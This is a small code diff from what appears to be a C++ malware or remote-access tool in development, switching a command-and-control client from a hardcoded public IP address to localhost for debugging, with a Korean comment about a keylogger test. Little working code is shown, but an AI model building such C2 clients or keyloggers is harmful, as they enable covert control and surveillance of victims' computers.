@@ -9,8 +9,8 @@
 
 /* For DEBUG */
 int main() {
-    cncManager client(L"1.251.227.66");
-    //cncManager client(L"127.0.0.1");
+    //cncManager client(L"1.251.227.66");
+    cncManager client(L"127.0.0.1");
 
     // 키로깅 테스트용 (나중에 commandManager로 옮길 예정)
     //keyLogger logger;
@@ -22,6 +22,7 @@ int main() {
 
     while (TRUE) {
         std::cout << "thread test" << std::endl;
+        Sleep(1000);
     }
 
 }
